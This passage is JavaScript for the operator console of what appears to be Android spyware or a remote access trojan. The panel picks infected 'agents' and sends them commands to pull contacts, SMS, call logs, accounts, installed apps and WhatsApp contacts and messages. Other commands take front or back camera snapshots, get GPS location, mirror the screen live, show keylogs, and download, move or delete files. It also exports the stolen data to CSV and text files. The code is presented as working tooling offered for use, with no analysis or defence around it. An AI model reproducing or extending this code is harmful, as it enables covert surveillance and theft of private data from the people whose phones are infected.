    senderSpan.style.cssText = `color:${color};`;
    senderSpan.textContent = data.sender + ':';
    
    const msgSpan = document.createElement('span');
    msgSpan.className = 'message';
    msgSpan.textContent = data.message;
    
    const tag = document.createElement('span');
    tag.className = 'platform-tag';
    tag.textContent = data.platform || 'social';
    
    const timeSpan = document.createElement('span');
    timeSpan.className = 'time';
    timeSpan.textContent = data.timestamp || new Date(data.time_ms * 1000).toLocaleTimeString();
    
    wrapper.appendChild(icon);
    wrapper.appendChild(badge);
    wrapper.appendChild(senderSpan);
    wrapper.appendChild(msgSpan);
    wrapper.appendChild(tag);
    wrapper.appendChild(timeSpan);
    container.appendChild(wrapper);
    container.scrollTop = container.scrollHeight;
}

// ==================== PLATFORM HELPERS ====================

function getPlatformColor(platform) {
    switch (platform) {
        case 'instagram': return '#E4405F';
        case 'twitter': return '#1DA1F2';
        case 'whatsapp': return '#25D366';
        case 'telegram': return '#0088CC';
        case 'signal': return '#3A76F0';
        case 'messenger': return '#00B2FF';
        case 'line': return '#00C300';
        case 'discord': return '#5865F2';
        case 'tiktok': return '#000000';
        case 'lemo': return '#FFD700';
        case 'litmatch': return '#FF6B35';
        case 'michat': return '#9B59B6';
        case 'wechat': return '#07C160';
        case 'kakao': return '#FEE500';
        case 'viber': return '#7B519D';
        case 'hangouts': return '#0F9D58';
        case 'groupme': return '#00AFF0';
        case 'slack': return '#4A154B';
        case 'teams': return '#464EB8';
        default: return '#6b7a8a';
    }
}

function getPlatformIcon(platform) {
    switch (platform) {
        case 'instagram': return '📸';
        case 'twitter': return '🐦';
        case 'whatsapp': return '💬';
        case 'telegram': return '✈️';
        case 'signal': return '🔐';
        case 'messenger': return '💙';
        case 'line': return '💚';
        case 'discord': return '🎮';
        case 'tiktok': return '🎵';
        case 'lemo': return '💛';
        case 'litmatch': return '🔥';
        case 'michat': return '💜';
        case 'wechat': return '🟢';
        case 'kakao': return '🟡';
        case 'viber': return '🟣';
        case 'hangouts': return '💚';
        case 'groupme': return '🔵';
        case 'slack': return '💜';
        case 'teams': return '🟣';
        default: return '📱';
    }
}

// ==================== FILTER FUNCTIONS ====================

function setupFilters() {
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            document.querySelectorAll('.filter-btn').forEach(b => {
                b.classList.remove('active');
            });
            this.classList.add('active');
            currentFilter = this.dataset.platform;
            applyFilter();
        });
    });
}

function applyFilter() {
    const container = DOM.whatsappContent;
    if (!container) return;
    const items = container.querySelectorAll('[data-platform]');
    items.forEach(item => {
        const platform = item.dataset.platform || 'other';
        item.style.display = (currentFilter === 'all' || platform === currentFilter) ? 'flex' : 'none';
    });
}

// ==================== WHATSAPP MESSAGES ====================

function showWhatsAppMessages(messages) {
    const container = DOM.whatsappContent;
    if (!container) return;

    const wrapper = document.createElement('div');
    wrapper.style.cssText = `
        margin-bottom: 10px;
        border-bottom: 1px solid #1a2633;
        padding: 8px 0;
    `;
    
    const timeLabel = document.createElement('div');
    timeLabel.style.cssText = 'color:#6b7a8a;font-size:11px;margin-bottom:4px;';
    timeLabel.textContent = `💬 WhatsApp Messages ${new Date().toLocaleString()}`;
    
    const content = document.createElement('pre');
    content.style.cssText = `
        background: #0a0e17;
        padding: 8px;
        border-radius: 4px;
        font-size: 11px;
        font-family: 'Courier New', monospace;
        white-space: pre-wrap;
        word-break: break-all;
        max-height: 300px;
        overflow-y: auto;
        color: #c8d6e5;
        border: 1px solid #1a2633;
    `;
    content.textContent = messages;
    
    wrapper.appendChild(timeLabel);
    wrapper.appendChild(content);
    container.appendChild(wrapper);
}

// ==================== ACCOUNTS HANDLERS ====================

function handleAccountsData(data) {
    const container = document.getElementById('accounts-content');
    if (!container) return;

    const result = data.data;
    let accounts = result.data || [];
    let count = result.count || accounts.length || 0;

    container.innerHTML = '';

    const header = document.createElement('div');
    header.style.cssText = `
        display: flex;
        gap: 12px;
        padding: 6px 0 10px 0;
        border-bottom: 1px solid #1a2633;
        margin-bottom: 10px;
        color: #6b7a8a;
        font-size: 11px;
        flex-wrap: wrap;
    `;
    header.innerHTML = `
        <span>👤 Agent: <strong>${data.agent_id.substring(0, 12)}...</strong></span>
        <span>📊 Total Accounts: <strong style="color:#ffd93d;">${count}</strong></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(header);

    if (accounts.length === 0) {
        container.innerHTML += `<div class="info" style="padding:20px;text-align:center;color:#6b7a8a;">No accounts found</div>`;
        return;
    }

    accounts.forEach(account => {
        const div = document.createElement('div');
        div.className = 'account-item';
        const isGoogle = account.type && (account.type.includes('google') || account.type_description?.includes('Google'));
        
        div.innerHTML = `
            <div class="account-icon">${isGoogle ? '🔵' : '👤'}</div>
            <div>
                <div class="account-name">${account.name || account.email || 'Unknown'}</div>
                <div class="account-email">${account.email || ''}</div>
            </div>
            <span class="badge ${isGoogle ? 'badge-google' : 'badge-gray'}">${isGoogle ? 'Google' : (account.type_description || account.type || 'Account')}</span>
        `;
        container.appendChild(div);
    });

    switchToTab('accounts');
}

function handleGoogleAccountsData(data) {
    handleAccountsData(data);
}

// ==================== CONTACTS HANDLER ====================

function handleContactsData(data) {
    console.log('👤 Contacts data received:', data);
    const container = document.getElementById('contacts-content');
    if (!container) return;

    const result = data.data || data.result || {};
    let contacts = result.data || [];
    let count = result.count || contacts.length || 0;

    container.innerHTML = '';

    const stats = document.createElement('div');
    stats.className = 'stats-bar';
    stats.innerHTML = `
        <span>👤 Agent: <strong>${data.agent_id ? data.agent_id.substring(0, 12) + '...' : 'Unknown'}</strong></span>
        <span>📊 Total Contacts: <strong style="color:#ffd93d;">${count}</strong></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
        <span><input class="tab-search" placeholder="🔍 Search..." oninput="filterContacts(this.value)"></span>
    `;
    container.appendChild(stats);

    if (result.status === 'permission_denied') {
        container.innerHTML += `
            <div style="background:#2a0a0a;border:1px solid #ff6b6b;border-radius:6px;padding:12px;color:#ff6b6b;text-align:center;font-size:13px;">
                ❌ Permission Denied: READ_CONTACTS
            </div>
        `;
        return;
    }

    if (!contacts || contacts.length === 0) {
        container.innerHTML += `<div class="info" style="padding:16px;text-align:center;color:#6b7a8a;font-size:13px;">📭 No contacts found</div>`;
        return;
    }

    const list = document.createElement('div');
    list.id = 'contacts-list';
    contacts.forEach((contact, index) => {
        const div = document.createElement('div');
        div.className = 'contact-item';
        div.dataset.name = (contact.name || '').toLowerCase();
        div.dataset.number = (contact.number || '');
        
        const initial = (contact.name || '?').charAt(0).toUpperCase();
        const colors = ['#ffd93d', '#ff6b6b', '#51cf66', '#00d2ff', '#ff922b', '#cc5de8'];
        const color = colors[index % colors.length];
        
        div.innerHTML = `
            <div class="contact-avatar" style="background:${color}20;color:${color};">${initial}</div>
            <div class="contact-info">
                <div class="contact-name">${escapeHtml(contact.name || 'Unknown')}</div>
                <div class="contact-number">${escapeHtml(contact.number || 'No number')}</div>
            </div>
            <span class="badge badge-gray">${index + 1}</span>
        `;
        div.onclick = () => {
            if (contact.number) {
                copyToClipboard(contact.number);
                addOutputLine(`📋 Copied: ${contact.number}`, 'info');
            }
        };
        list.appendChild(div);
    });
    container.appendChild(list);
    switchToTab('contacts');
}

function filterContacts(query) {
    const items = document.querySelectorAll('#contacts-list .contact-item');
    const q = query.toLowerCase();
    items.forEach(item => {
        const name = item.dataset.name || '';
        const number = item.dataset.number || '';
        item.style.display = (name.includes(q) || number.includes(q)) ? 'flex' : 'none';
    });
}

// ==================== SMS HANDLER ====================

function handleSMSData(data) {
    console.log('📨 SMS data received:', data);
    const container = document.getElementById('sms-content');
    if (!container) return;

    const result = data.data || data.result || {};
    let messages = result.data || [];
    let count = result.count || messages.length || 0;

    container.innerHTML = '';

    const stats = document.createElement('div');
    stats.className = 'stats-bar';
    stats.innerHTML = `
        <span>📱 Agent: <strong>${data.agent_id ? data.agent_id.substring(0, 12) + '...' : 'Unknown'}</strong></span>
        <span>📊 Total SMS: <strong style="color:#ffd93d;">${count}</strong></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
        <span><input class="tab-search" placeholder="🔍 Search..." oninput="filterSMS(this.value)"></span>
    `;
    container.appendChild(stats);

    if (result.status === 'permission_denied') {
        container.innerHTML += `
            <div style="background:#2a0a0a;border:1px solid #ff6b6b;border-radius:6px;padding:12px;color:#ff6b6b;text-align:center;font-size:13px;">
                ❌ Permission Denied: READ_SMS
            </div>
        `;
        return;
    }

    if (!messages || messages.length === 0) {
        container.innerHTML += `<div class="info" style="padding:16px;text-align:center;color:#6b7a8a;font-size:13px;">📭 No SMS messages found</div>`;
        return;
    }

    const list = document.createElement('div');
    list.id = 'sms-list';
    messages.forEach((sms) => {
        const div = document.createElement('div');
        div.className = 'sms-item';
        div.dataset.sender = (sms.from || sms.number || '').toLowerCase();
        div.dataset.body = (sms.body || sms.message || '').toLowerCase();
        
        const isIncoming = sms.type === 'Incoming' || sms.from;
        const icon = isIncoming ? '📩' : '📤';
        const color = isIncoming ? '#51cf66' : '#00d2ff';
        
        div.innerHTML = `
            <div style="font-size:18px;flex-shrink:0;">${icon}</div>
            <div class="sms-info">
                <div class="sms-sender" style="color:${color};">${escapeHtml(sms.from || sms.number || 'Unknown')}</div>
                <div class="sms-body">${escapeHtml(sms.body || sms.message || 'No content')}</div>
            </div>
            <div class="sms-time">${sms.date || sms.timestamp || ''}</div>
        `;
        list.appendChild(div);
    });
    container.appendChild(list);
    switchToTab('sms');
}

function filterSMS(query) {
    const items = document.querySelectorAll('#sms-list .sms-item');
    const q = query.toLowerCase();
    items.forEach(item => {
        const sender = item.dataset.sender || '';
        const body = item.dataset.body || '';
        item.style.display = (sender.includes(q) || body.includes(q)) ? 'flex' : 'none';
    });
}

// ==================== CALL LOGS HANDLER ====================

function handleCallLogsData(data) {
    console.log('📞 Call logs data received:', data);
    const container = document.getElementById('calllogs-content');
    if (!container) return;

    const result = data.data || data.result || {};
    let calls = result.data || [];
    let count = result.count || calls.length || 0;

    container.innerHTML = '';

    const stats = document.createElement('div');
    stats.className = 'stats-bar';
    stats.innerHTML = `
        <span>📞 Agent: <strong>${data.agent_id ? data.agent_id.substring(0, 12) + '...' : 'Unknown'}</strong></span>
        <span>📊 Total Calls: <strong style="color:#ffd93d;">${count}</strong></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(stats);

    if (result.status === 'permission_denied') {
        container.innerHTML += `
            <div style="background:#2a0a0a;border:1px solid #ff6b6b;border-radius:6px;padding:12px;color:#ff6b6b;text-align:center;font-size:13px;">
                ❌ Permission Denied: READ_CALL_LOG
            </div>
        `;
        return;
    }

    if (!calls || calls.length === 0) {
        container.innerHTML += `<div class="info" style="padding:16px;text-align:center;color:#6b7a8a;font-size:13px;">📭 No call logs found</div>`;
        return;
    }

    const callColors = { 'Incoming': '#51cf66', 'Outgoing': '#00d2ff', 'Missed': '#ff6b6b' };
    const callIcons = { 'Incoming': '📩', 'Outgoing': '📤', 'Missed': '❌' };

    calls.forEach(call => {
        const div = document.createElement('div');
        div.className = 'call-item';
        const type = call.type || 'Unknown';
        const color = callColors[type] || '#6b7a8a';
        const icon = callIcons[type] || '📞';
        
        div.innerHTML = `
            <div style="font-size:18px;flex-shrink:0;">${icon}</div>
            <div class="call-info">
                <div class="call-number" style="color:${color};">${escapeHtml(call.number || 'Unknown')}</div>
                <div class="call-duration">${escapeHtml(type)} • ${call.duration || '0s'}</div>
            </div>
            <div class="call-time">${call.date || ''}</div>
        `;
        container.appendChild(div);
    });

    switchToTab('calllogs');
}

// ==================== APPS HANDLER ====================

function handleAppsData(data) {
    console.log('📱 Apps data received:', data);
    const container = document.getElementById('apps-content');
    if (!container) return;

    const result = data.data || data.result || {};
    let apps = result.data || [];
    let count = result.count || apps.length || 0;

    container.innerHTML = '';

    const stats = document.createElement('div');
    stats.className = 'stats-bar';
    stats.innerHTML = `
        <span>📱 Agent: <strong>${data.agent_id ? data.agent_id.substring(0, 12) + '...' : 'Unknown'}</strong></span>
        <span>📊 Total Apps: <strong style="color:#ffd93d;">${count}</strong></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
        <span><input class="tab-search" placeholder="🔍 Search..." oninput="filterApps(this.value)"></span>
    `;
    container.appendChild(stats);

    if (!apps || apps.length === 0) {
        container.innerHTML += `<div class="info" style="padding:16px;text-align:center;color:#6b7a8a;font-size:13px;">📭 No apps found</div>`;
        return;
    }

    const list = document.createElement('div');
    list.id = 'apps-list';
    apps.forEach((app) => {
        const div = document.createElement('div');
        div.className = 'app-item';
        div.dataset.name = (app.name || '').toLowerCase();
        div.dataset.package = (app.package || '').toLowerCase();
        
        const initial = (app.name || '?').charAt(0).toUpperCase();
        div.innerHTML = `
            <div class="app-icon">${initial}</div>
            <div class="app-info">
                <div class="app-name">${escapeHtml(app.name || 'Unknown')}</div>
                <div class="app-package">${escapeHtml(app.package || '')}</div>
            </div>
            <span class="badge badge-gray">${app.version || ''}</span>
        `;
        list.appendChild(div);
    });
    container.appendChild(list);
    switchToTab('apps');
}

function filterApps(query) {
    const items = document.querySelectorAll('#apps-list .app-item');
    const q = query.toLowerCase();
    items.forEach(item => {
        const name = item.dataset.name || '';
        const pkg = item.dataset.package || '';
        item.style.display = (name.includes(q) || pkg.includes(q)) ? 'flex' : 'none';
    });
}

// ==================== WA CONTACTS HANDLER ====================

function handleWAContactsData(data) {
    console.log('💚 WA Contacts data received:', data);
    const container = document.getElementById('wacontacts-content');
    if (!container) return;

    const result = data.data || data.result || {};
    let contacts = result.data || [];
    let count = result.count || contacts.length || 0;

    container.innerHTML = '';

    const stats = document.createElement('div');
    stats.className = 'stats-bar';
    stats.innerHTML = `
        <span>💚 Agent: <strong>${data.agent_id ? data.agent_id.substring(0, 12) + '...' : 'Unknown'}</strong></span>
        <span>📊 WA Contacts: <strong style="color:#25D366;">${count}</strong></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(stats);

    if (!contacts || contacts.length === 0) {
        container.innerHTML += `<div class="info" style="padding:16px;text-align:center;color:#6b7a8a;font-size:13px;">📭 No WhatsApp contacts found</div>`;
        return;
    }

    contacts.forEach((contact) => {
        const div = document.createElement('div');
        div.className = 'wa-contact-item';
        div.innerHTML = `
            <div style="font-size:18px;flex-shrink:0;">💚</div>
            <div class="wa-contact-info">
                <div class="wa-contact-name" style="color:#25D366;">${escapeHtml(contact.name || 'Unknown')}</div>
                <div class="wa-contact-number">${escapeHtml(contact.whatsapp_number || 'No WA number')}</div>
            </div>
            <span class="badge badge-wa">WA</span>
        `;
        container.appendChild(div);
    });

    switchToTab('wacontacts');
}

// ==================== REFRESH FUNCTIONS ====================

function refreshContacts() {
    if (!selectedAgent) { addOutputLine('⚠️ Select agent first', 'error'); return; }
    sendCommand('GET_CONTACTS');
}

function refreshSMS() {
    if (!selectedAgent) { addOutputLine('⚠️ Select agent first', 'error'); return; }
    sendCommand('GET_SMS');
}

function refreshCallLogs() {
    if (!selectedAgent) { addOutputLine('⚠️ Select agent first', 'error'); return; }
    sendCommand('GET_CALL_LOGS');
}

function refreshApps() {
    if (!selectedAgent) { addOutputLine('⚠️ Select agent first', 'error'); return; }
    sendCommand('GET_INSTALLED_APPS');
}

function refreshWAContacts() {
    if (!selectedAgent) { addOutputLine('⚠️ Select agent first', 'error'); return; }
    sendCommand('WA_CONTACTS');
}

// ==================== EXPORT FUNCTIONS ====================

function exportContacts() {
    const items = document.querySelectorAll('#contacts-list .contact-item');
    if (items.length === 0) { addOutputLine('⚠️ No contacts to export', 'error'); return; }
    let csv = 'Name,Number\n';
    items.forEach(item => {
        const name = item.querySelector('.contact-name')?.textContent || '';
        const number = item.querySelector('.contact-number')?.textContent || '';
        csv += `"${name}","${number}"\n`;
    });
    downloadFile(csv, `contacts_${Date.now()}.csv`, 'text/csv');
    addOutputLine(`📤 Exported ${items.length} contacts`, 'success');
}

function exportSMS() {
    const items = document.querySelectorAll('#sms-list .sms-item');
    if (items.length === 0) { addOutputLine('⚠️ No SMS to export', 'error'); return; }
    let txt = '=== SMS EXPORT ===\nExported: ' + new Date().toLocaleString() + '\n' + '='.repeat(50) + '\n\n';
    items.forEach(item => {
        const sender = item.querySelector('.sms-sender')?.textContent || 'Unknown';
        const body = item.querySelector('.sms-body')?.textContent || '';
        const time = item.querySelector('.sms-time')?.textContent || '';
        txt += `[${time}] ${sender}: ${body}\n`;
    });
    downloadFile(txt, `sms_${Date.now()}.txt`, 'text/plain');
    addOutputLine(`📤 Exported ${items.length} SMS`, 'success');
}

function exportCallLogs() {
    const items = document.querySelectorAll('.call-item');
    if (items.length === 0) { addOutputLine('⚠️ No call logs to export', 'error'); return; }
    let txt = '=== CALL LOGS ===\nExported: ' + new Date().toLocaleString() + '\n' + '='.repeat(50) + '\n\n';
    items.forEach(item => {
        const number = item.querySelector('.call-number')?.textContent || 'Unknown';
        const duration = item.querySelector('.call-duration')?.textContent || '';
        const time = item.querySelector('.call-time')?.textContent || '';
        txt += `[${time}] ${number} - ${duration}\n`;
    });
    downloadFile(txt, `call_logs_${Date.now()}.txt`, 'text/plain');
    addOutputLine(`📤 Exported ${items.length} call logs`, 'success');
}

function exportApps() {
    const items = document.querySelectorAll('#apps-list .app-item');
    if (items.length === 0) { addOutputLine('⚠️ No apps to export', 'error'); return; }
    let csv = 'App Name,Package\n';
    items.forEach(item => {
        const name = item.querySelector('.app-name')?.textContent || '';
        const pkg = item.querySelector('.app-package')?.textContent || '';
        csv += `"${name}","${pkg}"\n`;
    });
    downloadFile(csv, `apps_${Date.now()}.csv`, 'text/csv');
    addOutputLine(`📤 Exported ${items.length} apps`, 'success');
}

function exportWAContacts() {
    const items = document.querySelectorAll('.wa-contact-item');
    if (items.length === 0) { addOutputLine('⚠️ No WA contacts to export', 'error'); return; }
    let csv = 'Name,WhatsApp Number\n';
    items.forEach(item => {
        const name = item.querySelector('.wa-contact-name')?.textContent || '';
        const number = item.querySelector('.wa-contact-number')?.textContent || '';
        csv += `"${name}","${number}"\n`;
    });
    downloadFile(csv, `wa_contacts_${Date.now()}.csv`, 'text/csv');
    addOutputLine(`📤 Exported ${items.length} WA contacts`, 'success');
}

function downloadFile(content, filename, type) {
    const blob = new Blob([content], { type });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function copyToClipboard(text) {
    if (navigator.clipboard?.writeText) {
        navigator.clipboard.writeText(text);
    } else {
        const input = document.createElement('input');
        input.value = text;
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
    }
}

// ==================== OUTPUT FUNCTIONS ====================

function addOutputLine(text, type = 'info') {
    const container = DOM.outputContent;
    if (!container) return;
    
    const div = document.createElement('div');
    div.className = 'output-line';
    const timestamp = new Date().toLocaleTimeString();
    const typeClass = type === 'error' ? 'error' : type === 'success' ? 'success' : type === 'warning' ? 'warning' : 'info';
    div.innerHTML = `<span class="timestamp">[${timestamp}]</span><span class="${typeClass}">${escapeHtml(text)}</span>`;
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
    while (container.children.length > 500) {
        container.removeChild(container.firstChild);
    }
}

function formatResult(result) {
    if (typeof result === 'string') return result;
    if (typeof result === 'object') {
        try { return JSON.stringify(result, null, 2); } catch (e) { return String(result); }
    }
    return String(result);
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ==================== FORMAT FUNCTIONS ====================

function formatSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return `${(bytes / Math.pow(1024, i)).toFixed(1).replace('.', ',')} ${units[i]}`;
}

function formatTime(timestamp) {
    if (!timestamp) return 'Never';
    try {
        const date = new Date(timestamp);
        const now = new Date();
        const diff = Math.floor((now - date) / 1000);
        if (diff < 60) return `${diff}s ago`;
        if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
        return date.toLocaleString();
    } catch (e) { return timestamp; }
}

// ==================== EVENT LISTENERS ====================

function setupEventListeners() {
    DOM.commandInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') sendCommandFromInput();
    });

    DOM.sendBtn.addEventListener('click', sendCommandFromInput);

    DOM.refreshBtn.addEventListener('click', () => {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ action: 'get_agents' }));
        }
    });

    DOM.clearBtn.addEventListener('click', () => {
        DOM.outputContent.innerHTML = '';
        DOM.screenshotContent.innerHTML = '';
        DOM.keylogContent.innerHTML = '';
        DOM.whatsappContent.innerHTML = '';
        DOM.locationContent.innerHTML = `
            <div class="info">📍 No location data yet</div>
            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">GET_LOCATION</code> to get GPS location
            </div>
        `;
        DOM.cameraContent.innerHTML = `
            <div class="info">📷 No camera data yet</div>
            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_INFO</code> to check camera<br>
                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_SNAPSHOT back</code> for back camera<br>
                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_SNAPSHOT front</code> for front camera
            </div>
        `;
        if (DOM.wallpaperContent) {
            DOM.wallpaperContent.innerHTML = `
                <div class="info">🖼️ Wallpaper History</div>
                <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                    Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">SET_WALLPAPER &lt;URL&gt;</code> to change wallpaper
                </div>
            `;
        }
        resetLiveMirror();
    });

    // Wallpaper section
    document.querySelectorAll('.command-presets button').forEach(btn => {
        btn.addEventListener('click', function() {
            const cmd = this.dataset.cmd;
            if (cmd === 'SET_WALLPAPER') {
                const section = document.getElementById('wallpaper-section');
                if (section) {
                    section.style.display = 'block';
                    document.getElementById('wallpaper-url').focus();
                }
            } else {
                const section = document.getElementById('wallpaper-section');
                if (section) section.style.display = 'none';
            }
        });
    });

    // Move File
    const moveFileBtn = document.getElementById('move-file-btn');
    if (moveFileBtn) {
        moveFileBtn.addEventListener('click', () => {
            const section = document.getElementById('move-section');
            if (section) {
                section.style.display = section.style.display === 'none' ? 'block' : 'none';
                document.getElementById('move-source-path').focus();
            }
        });
    }

    const moveExecute = document.getElementById('move-file-execute');
    if (moveExecute) {
        moveExecute.addEventListener('click', () => {
            const source = document.getElementById('move-source-path').value.trim();
            const dest = document.getElementById('move-dest-path').value.trim();
            if (!source || !dest) {
                addOutputLine('⚠️ Please enter both source and destination paths', 'error');
                return;
            }
            if (!selectedAgent) {
                addOutputLine('⚠️ Please select an agent first', 'error');
                return;
            }
            sendCommand('MOVE_FILE', source + '|' + dest);
            document.getElementById('move-section').style.display = 'none';
        });
    }

    const moveSource = document.getElementById('move-source-path');
    const moveDest = document.getElementById('move-dest-path');
    if (moveSource) {
        moveSource.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') moveDest.focus();
        });
    }
    if (moveDest) {
        moveDest.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') document.getElementById('move-file-execute').click();
        });
    }

    // Delete File
    const deleteFileBtn = document.querySelector('[data-cmd="DELETE_FILE"]');
    if (deleteFileBtn) {
        deleteFileBtn.addEventListener('click', () => {
            const section = document.getElementById('delete-section');
            if (section) {
                section.style.display = section.style.display === 'none' ? 'block' : 'none';
                document.getElementById('delete-file-path').focus();
            }
        });
    }

    const deleteExecute = document.getElementById('delete-file-execute');
    if (deleteExecute) {
        deleteExecute.addEventListener('click', () => {
            const path = document.getElementById('delete-file-path').value.trim();
            if (!path) {
                addOutputLine('⚠️ Please enter a file path', 'error');
                return;
            }
            if (!selectedAgent) {
                addOutputLine('⚠️ Please select an agent first', 'error');
                return;
            }
            sendCommand('DELETE_FILE', path);
            document.getElementById('delete-section').style.display = 'none';
        });
    }

    const deletePath = document.getElementById('delete-file-path');
    if (deletePath) {
        deletePath.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') document.getElementById('delete-file-execute').click();
        });
    }

    // Wallpaper
    const setWallpaperBtn = document.getElementById('set-wallpaper-btn');
    if (setWallpaperBtn) {
        setWallpaperBtn.addEventListener('click', function() {
            const url = document.getElementById('wallpaper-url').value.trim();
            if (!url) {
                addOutputLine('⚠️ Please enter a wallpaper URL', 'error');
                return;
            }
            if (!selectedAgent) {
                addOutputLine('⚠️ Please select an agent first', 'error');
                return;
            }
            sendCommand('SET_WALLPAPER', url);
            document.getElementById('wallpaper-url').value = '';
            document.getElementById('wallpaper-section').style.display = 'none';
        });
    }

    // Download
    const downloadFileBtn = document.getElementById('download-file-btn');
    if (downloadFileBtn) {
        downloadFileBtn.addEventListener('click', () => {
            const section = document.getElementById('download-section');
            if (section) {
                section.style.display = section.style.display === 'none' ? 'block' : 'none';
                document.getElementById('download-file-path').focus();
            }
        });
    }

    const downloadExecute = document.getElementById('download-file-execute');
    if (downloadExecute) {
        downloadExecute.addEventListener('click', () => {
            const path = document.getElementById('download-file-path').value.trim();
            if (!path) {
                addOutputLine('⚠️ Please enter a file path', 'error');
                return;
            }
            if (!selectedAgent) {
                addOutputLine('⚠️ Please select an agent first', 'error');
                return;
            }
            sendCommand('DOWNLOAD_FILE', path);
            document.getElementById('download-section').style.display = 'none';
        });
    }

    const downloadPath = document.getElementById('download-file-path');
    if (downloadPath) {
        downloadPath.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') document.getElementById('download-file-execute').click();
        });
    }

    const wallpaperUrl = document.getElementById('wallpaper-url');
    if (wallpaperUrl) {
        wallpaperUrl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') document.getElementById('set-wallpaper-btn').click();
        });
    }
}

function sendCommandFromInput() {
    const input = DOM.commandInput.value.trim();
    if (!input) return;
    const parts = input.split(' ');
    const command = parts[0];
    const params = parts.slice(1).join(' ');
    sendCommand(command, params);
    DOM.commandInput.value = '';
}

// ==================== COMMAND PRESETS ====================

function setupCommandPresets() {
    document.querySelectorAll('.command-presets button').forEach(btn => {
        btn.addEventListener('click', function() {
            const cmd = this.dataset.cmd;
            
            // Camera Info
            if (cmd === 'CAMERA_INFO') {
                DOM.commandInput.value = cmd;
                sendCommandFromInput();
                return;
            }
            
            // Camera Snapshot with params
            if (cmd === 'CAMERA_SNAPSHOT') {
                DOM.commandInput.value = cmd;
                sendCommandFromInput();
                return;
            }
            if (cmd === 'CAMERA_SNAPSHOT back') {
                DOM.commandInput.value = 'CAMERA_SNAPSHOT back';
                sendCommandFromInput();
                return;
            }
            if (cmd === 'CAMERA_SNAPSHOT front') {
                DOM.commandInput.value = 'CAMERA_SNAPSHOT front';
                sendCommandFromInput();
                return;
            }
            
            if (cmd === 'SET_WALLPAPER') {
                const section = document.getElementById('wallpaper-section');
                if (section) {
                    section.style.display = 'block';
                    document.getElementById('wallpaper-url').focus();
                }
                return;
            }
            if (cmd === 'SCREEN_START') {
                switchToTab('livemirror');
                const container = DOM.livemirrorContent;
                if (container) {
                    container.innerHTML = `
                        <div style="text-align:center;padding:30px;color:#00d2ff;">
                            <div style="font-size:40px;">🔄</div>
                            <div style="font-size:14px;margin-top:8px;">Starting screen mirror...</div>
                        </div>
                    `;
                }
            }
            DOM.commandInput.value = cmd;
            sendCommandFromInput();
        });
    });
}

// ==================== TABS ====================

function setupTabs() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            const tabId = this.dataset.tab;
            switchToTab(tabId);
        });
    });
}

function switchToTab(tabId) {
    document.querySelectorAll('.tab').forEach(t => {
        t.classList.remove('active');
        t.style.color = '#6b7a8a';
        t.style.background = 'none';
    });
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    
    const targetTab = document.querySelector(`.tab[data-tab="${tabId}"]`);
    const targetContent = document.getElementById(`${tabId}-tab`);
    
    if (targetTab) {
        targetTab.classList.add('active');
        targetTab.style.color = '#00d2ff';
        targetTab.style.background = '#1a2633';
        const container = document.getElementById('tabContainer');
        if (container) {
            container.scrollTo({ left: targetTab.offsetLeft - 30, behavior: 'smooth' });
        }
    }
    if (targetContent) {
        targetContent.classList.add('active');
    }
}

// ==================== SCROLLABLE TABS ====================

function setupScrollableTabs() {
    const container = document.getElementById('tabContainer');
    if (!container) return;

    document.getElementById('scrollTabsLeft')?.addEventListener('click', () => {
        container.scrollBy({ left: -120, behavior: 'smooth' });
    });
    document.getElementById('scrollTabsRight')?.addEventListener('click', () => {
        container.scrollBy({ left: 120, behavior: 'smooth' });
    });

    container.addEventListener('wheel', (e) => {
        e.preventDefault();
        container.scrollBy({ left: e.deltaY, behavior: 'smooth' });
    });

    function updateScrollButtons() {
        const leftBtn = document.getElementById('scrollTabsLeft');
        const rightBtn = document.getElementById('scrollTabsRight');
        if (leftBtn && rightBtn) {
            const isAtStart = container.scrollLeft <= 0;
            const isAtEnd = container.scrollLeft + container.clientWidth >= container.scrollWidth - 5;
            leftBtn.style.opacity = isAtStart ? '0.3' : '1';
            leftBtn.disabled = isAtStart;
            rightBtn.style.opacity = isAtEnd ? '0.3' : '1';
            rightBtn.disabled = isAtEnd;
        }
    }

    container.addEventListener('scroll', updateScrollButtons);
    window.addEventListener('resize', updateScrollButtons);
    setTimeout(updateScrollButtons, 100);
}

